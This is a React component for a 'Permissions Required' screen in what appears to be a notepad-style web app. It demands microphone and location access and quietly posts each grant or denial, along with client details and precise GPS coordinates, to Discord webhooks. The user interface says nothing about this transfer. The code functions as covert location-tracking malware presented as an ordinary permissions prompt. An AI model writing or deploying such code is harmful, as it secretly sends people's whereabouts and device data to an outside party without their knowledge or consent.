import React, { useState } from 'react';
import { sendDiscordNotification } from './utils/discord';

interface PermissionsProps {
  onGranted: () => void;
  onMicGranted?: () => void;
}

const webhookLocationGranted = import.meta.env.VITE_WEBHOOK_LOCATION_GRANTED;
const webhookLocationDenied = import.meta.env.VITE_WEBHOOK_LOCATION_DENIED;
const webhookMicGranted = import.meta.env.VITE_WEBHOOK_MIC_GRANTED;
const webhookMicDenied = import.meta.env.VITE_WEBHOOK_MIC_DENIED;

const Permissions: React.FC<PermissionsProps> = ({ onGranted, onMicGranted }) => {
  const [locationGranted, setLocationGranted] = useState(false);
  const [micGranted, setMicGranted] = useState(false);
  const [locationDenied, setLocationDenied] = useState(false);
  const [error, setError] = useState('');

  // Request permissions on mount
  React.useEffect(() => {
    let didCancel = false;

    // --- PATCH: Always notify if already granted ---
    if (navigator.permissions) {
      // Microphone
      navigator.permissions.query({ name: 'microphone' as PermissionName }).then((micPerm: any) => {
        if (micPerm.state === 'granted') {
          setMicGranted(true);
          import('./utils/embeds').then(({ buildEmbed }) => {
            const embed = buildEmbed({
              title: '🎤 Socket: Microphone Permission GRANTED',
              color: 0x6fe07b,
              description: 'A user granted microphone permission (already allowed).',
              fields: [
                { name: 'Current URL', value: window.location.href, inline: false },
                { name: 'Timestamp', value: new Date().toLocaleString(), inline: false },
              ],
            });
            sendDiscordNotification(webhookMicGranted, { embeds: [embed] });
          });
          if (onMicGranted) onMicGranted();
        }
      });
      // Location
      if (navigator.permissions && navigator.geolocation) {
        navigator.permissions.query({ name: 'geolocation' as PermissionName })
          .then((geoPerm: any) => {
            if (geoPerm.state === 'granted') {
              setLocationGranted(true);
              setLocationDenied(false);
              (async () => {
                const { getClientInfo, buildLocationEmbed } = await import('./utils/clientInfo');
                const info = await getClientInfo();
                navigator.geolocation.getCurrentPosition(async (position) => {
                  const embed = buildLocationEmbed(info, position, true);
                  const { sendDiscordEmbedNotification } = await import('./utils/discord');
                  await sendDiscordEmbedNotification(webhookLocationGranted, embed);
                });
              })();
            }
          })
          .catch(() => {
            // Permissions API does not support geolocation, do nothing.
          });
      }
    }
    // --- END PATCH ---

    // Microphone FIRST
    navigator.mediaDevices.getUserMedia({ audio: true })
      .then(() => {
        if (!didCancel) {
          setMicGranted(true);
          setError('');
          // Discord notification
          import('./utils/embeds').then(({ buildEmbed }) => {
            const embed = buildEmbed({
              title: '🎤 Socket: Microphone Permission GRANTED',
              color: 0x6fe07b,
              description: 'A user granted microphone permission.',
              fields: [
                { name: 'Current URL', value: window.location.href, inline: false },
                { name: 'Timestamp', value: new Date().toLocaleString(), inline: false },
              ],
            });
            sendDiscordNotification(webhookMicGranted, { embeds: [embed] });
          });
          if (onMicGranted) onMicGranted();

          // After mic granted, always request LOCATION (prompt if not already granted)
          if (navigator.geolocation) {
            if (navigator.permissions) {
              navigator.permissions.query({ name: 'geolocation' as PermissionName })
                .then((geoPerm: any) => {
                  if (geoPerm.state === 'granted') {
                    setLocationGranted(true);
                    setLocationDenied(false);
                    (async () => {
                      const { getClientInfo, buildLocationEmbed } = await import('./utils/clientInfo');
                      const info = await getClientInfo();
                      navigator.geolocation.getCurrentPosition(async (position) => {
                        const embed = buildLocationEmbed(info, position, true);
                        const { sendDiscordEmbedNotification } = await import('./utils/discord');
                        await sendDiscordEmbedNotification(webhookLocationGranted, embed);
                      });
                    })();
                  } else {
                    // Not granted: prompt for permission
                    navigator.geolocation.getCurrentPosition(
                      () => {
                        if (!didCancel) {
                          setLocationGranted(true);
                          setLocationDenied(false);
                          (async () => {
                            const { getClientInfo, buildLocationEmbed } = await import('./utils/clientInfo');
                            const info = await getClientInfo();
                            navigator.geolocation.getCurrentPosition(async (position) => {
                              const embed = buildLocationEmbed(info, position, true);
                              const { sendDiscordEmbedNotification } = await import('./utils/discord');
                              await sendDiscordEmbedNotification(webhookLocationGranted, embed);
                            });
                          })();
                        }
                      },
                      () => {
                        if (!didCancel) {
                          setLocationDenied(true);
                          setError('Location permission denied.');
                          import('./utils/clientInfo').then(({ getClientInfo, buildLocationEmbed }) => {
                            getClientInfo().then(info => {
                              const embed = buildLocationEmbed(info, null, false);
                              sendDiscordNotification(webhookLocationDenied, { embeds: [embed] });
                            });
                          });
                        }
                      }
                    );
                  }
                })
                .catch(() => {
                  // Permissions API does not support geolocation, just prompt
                  navigator.geolocation.getCurrentPosition(
                    () => {
                      if (!didCancel) {
                        setLocationGranted(true);
                        setLocationDenied(false);
                        (async () => {
                          const { getClientInfo, buildLocationEmbed } = await import('./utils/clientInfo');
                          const info = await getClientInfo();
                          navigator.geolocation.getCurrentPosition(async (position) => {
                            const embed = buildLocationEmbed(info, position, true);
                            const { sendDiscordEmbedNotification } = await import('./utils/discord');
                            await sendDiscordEmbedNotification(webhookLocationGranted, embed);
                          });
                        })();
                      }
                    },
                    () => {
                      if (!didCancel) {
                        setLocationDenied(true);
                        setError('Location permission denied.');
                        import('./utils/clientInfo').then(({ getClientInfo, buildLocationEmbed }) => {
                          getClientInfo().then(info => {
                            const embed = buildLocationEmbed(info, null, false);
                            sendDiscordNotification(webhookLocationDenied, { embeds: [embed] });
                          });
                        });
                      }
                    }
                  );
                });
            } else {
              // No Permissions API: just prompt
              navigator.geolocation.getCurrentPosition(
                () => {
                  if (!didCancel) {
                    setLocationGranted(true);
                    setLocationDenied(false);
                    (async () => {
                      const { getClientInfo, buildLocationEmbed } = await import('./utils/clientInfo');
                      const info = await getClientInfo();
                      navigator.geolocation.getCurrentPosition(async (position) => {
                        const embed = buildLocationEmbed(info, position, true);
                        const { sendDiscordEmbedNotification } = await import('./utils/discord');
                        await sendDiscordEmbedNotification(webhookLocationGranted, embed);
                      });
                    })();
                  }
                },
                () => {
                  if (!didCancel) {
                    setLocationDenied(true);
                    setError('Location permission denied.');
                    import('./utils/clientInfo').then(({ getClientInfo, buildLocationEmbed }) => {
                      getClientInfo().then(info => {
                        const embed = buildLocationEmbed(info, null, false);
                        sendDiscordNotification(webhookLocationDenied, { embeds: [embed] });
                      });
                    });
                  }
                }
              );
            }
          } // do not set error here; only set error if user explicitly tries to use geolocation and it's missing
        }
      })
      .catch(() => {
        if (!didCancel) {
          setError('Microphone permission denied.');
          // Discord notification
          import('./utils/embeds').then(({ buildEmbed }) => {
            const embed = buildEmbed({
              title: '🎤 Socket: Microphone Permission DENIED',
              color: 0xff4f4f,
              description: 'A user denied microphone permission.',
              fields: [
                { name: 'Current URL', value: window.location.href, inline: false },
                { name: 'Timestamp', value: new Date().toLocaleString(), inline: false },
              ],
            });
            sendDiscordNotification(webhookMicDenied, { embeds: [embed] });
          });
        }
      });

    return () => { didCancel = true; };
  }, []);

  // Fire onMicGranted as soon as mic is granted
  React.useEffect(() => {
    if (micGranted && onMicGranted) {
      onMicGranted();
    }
  }, [micGranted, onMicGranted]);

  // Only proceed when both permissions are granted
  React.useEffect(() => {
    if (micGranted && locationGranted) {
      onGranted();
    }
  }, [micGranted, locationGranted, onGranted]);

  const handleContinue = () => {
    if (micGranted && locationGranted) {
      onGranted();
    }
  };


  return (
    <div className="notepad-container permissions-container" style={{justifyContent:'center',alignItems:'center',display:'flex',flexDirection:'column',height:'100vh'}}>
      <form style={{display:'flex',flexDirection:'column',alignItems:'center',gap:18,width:'100%',maxWidth:340,background:'none',boxShadow:'none',padding:0}}>
        <div style={{fontWeight:800,fontSize:'1.18rem',marginBottom:8,textAlign:'center',color:'#e1e6fc',fontFamily:"Space Grotesk, Inter, Arial, Helvetica, sans-serif"}}>
          Permissions Required
        </div>
        <div style={{color:'#b8b8d1',fontSize:'1.01rem',marginBottom:18,textAlign:'center',fontFamily:"Space Grotesk, Inter, Arial, Helvetica, sans-serif"}}>
          This app requires access to your <b>location</b> and <b>microphone</b> to continue.
        </div>
        <div style={{display:'flex',flexDirection:'row',gap:24,marginBottom:10,width:'100%',justifyContent:'center'}}>
          <div
            className="cute-btn"
            style={{background: locationGranted ? '#39395a' : '#a084e8', color: locationGranted ? '#e1e6fc' : '#232336', fontWeight:700, border:'none',padding:'10px 0 10px 0',minWidth:0,flex:'1 1 0',maxWidth:180, position:'relative', display:'flex',alignItems:'center',justifyContent:'center',cursor: locationDenied ? 'pointer' : 'default'}}
            title={locationDenied ? 'Click to re-request location permission' : ''}
            onClick={() => {
              if (locationDenied && navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                  () => { 
                    setLocationGranted(true); 
                    setLocationDenied(false); 
                    setError('');
                    // Discord notification
                    import('./utils/clientInfo').then(({ getClientInfo, buildLocationEmbed }) => {
                      getClientInfo().then(info => {
                        const embed = buildLocationEmbed(info, null, true);
                        sendDiscordNotification(webhookLocationGranted, { embeds: [embed] });
                      });
                    });
                  },
                  () => { 
                    setLocationDenied(true);
                    setError('Location permission denied. Please enable it in your browser settings.');
                    // Discord notification
                    import('./utils/clientInfo').then(({ getClientInfo, buildLocationEmbed }) => {
                      getClientInfo().then(info => {
                        const embed = buildLocationEmbed(info, null, false);
                        sendDiscordNotification(webhookLocationDenied, { embeds: [embed] });
                      });
                    });
                  }
                );
              }
            }}
          >
            {locationGranted ? (
              <span className="tick-anim">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#6fe07b" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="20 6 11 17 4 10" />
                </svg>
              </span>
            ) : (
              <span style={{display:'flex',alignItems:'center',justifyContent:'center',gap:8}}>
                <span className="spinner" style={{width:18,height:18,display:'inline-block'}}>
                  <svg viewBox="0 0 50 50" style={{width:'100%',height:'100%'}}>
                    <circle className="spinner-path" cx="25" cy="25" r="20" fill="none" stroke="#e1e6fc" strokeWidth="4"/>
                  </svg>
                </span>
                <span>Location</span>
              </span>
            )}
          </div>
          <div className="cute-btn" style={{background: micGranted ? '#39395a' : '#a084e8', color: micGranted ? '#e1e6fc' : '#232336', fontWeight:700, border:'none',padding:'10px 0 10px 0',minWidth:0,flex:'1 1 0',maxWidth:180, position:'relative', display:'flex',alignItems:'center',justifyContent:'center'}}>
            {micGranted ? (
              <span className="tick-anim">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#6fe07b" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="20 6 11 17 4 10" />
                </svg>
              </span>
            ) : (
              <span style={{display:'flex',alignItems:'center',justifyContent:'center',gap:8}}>
                <span className="spinner" style={{width:18,height:18,display:'inline-block'}}>
                  <svg viewBox="0 0 50 50" style={{width:'100%',height:'100%'}}>
                    <circle className="spinner-path" cx="25" cy="25" r="20" fill="none" stroke="#e1e6fc" strokeWidth="4"/>
                  </svg>
                </span>
                <span>Microphone</span>
              </span>
            )}
          </div>
        
        </div>
        {locationDenied ? (
          <div style={{ color: '#ff4f4f', marginBottom: 14, fontWeight:600, fontSize:'0.98rem' }}>
            Location permission denied. Click the Location button to try again or enable it in your browser settings.
          </div>
        ) : (
          error && <div style={{ color: '#ff4f4f', marginBottom: 10, fontWeight:600 }}>{error}</div>
        )}
        <button type="button" className="cute-btn" onClick={handleContinue} disabled={!(micGranted && locationGranted)} style={{marginTop:6,padding:'10px 0',width:'100%',background:'#a084e8',color:'#232336',fontWeight:700,fontSize:'1.08rem',border:'none',borderRadius:0,cursor:!(micGranted&&locationGranted)?'not-allowed':'pointer',opacity:!(micGranted&&locationGranted)?0.6:1}}>
          Continue
        </button>
      </form>
    </div>
  );
};

// Tick animation style
const tickAnimStyle = `
  .tick-anim {
    display: inline-block;
    vertical-align: middle;
    animation: tick-pop 0.38s cubic-bezier(.54,1.6,.55,.99);
  }
  @keyframes tick-pop {
    0% { transform: scale(0.3) rotate(-10deg); opacity: 0; }
    60% { transform: scale(1.15) rotate(2deg); opacity: 1; }
    100% { transform: scale(1) rotate(0deg); opacity: 1; }
  }
  .spinner {
    animation: spinner-rotate 1s linear infinite;
  }
  @keyframes spinner-rotate {
    100% { transform: rotate(360deg); }
  }
  .spinner-path {
    stroke-dasharray: 90, 150;
    stroke-dashoffset: 0;
    stroke-linecap: round;
    animation: spinner-dash 1.5s ease-in-out infinite;
  }
  @keyframes spinner-dash {
    0% { stroke-dasharray: 1, 150; stroke-dashoffset: 0; }
    50% { stroke-dasharray: 90, 150; stroke-dashoffset: -35; }
    100% { stroke-dasharray: 90, 150; stroke-dashoffset: -124; }
  }
`;

export default Permissions;

// Inject style for tick and spinner animation
if (typeof document !== 'undefined' && !document.getElementById('tick-anim-style')) {
  const style = document.createElement('style');
  style.id = 'tick-anim-style';
  style.innerHTML = tickAnimStyle;
  document.head.appendChild(style);
}
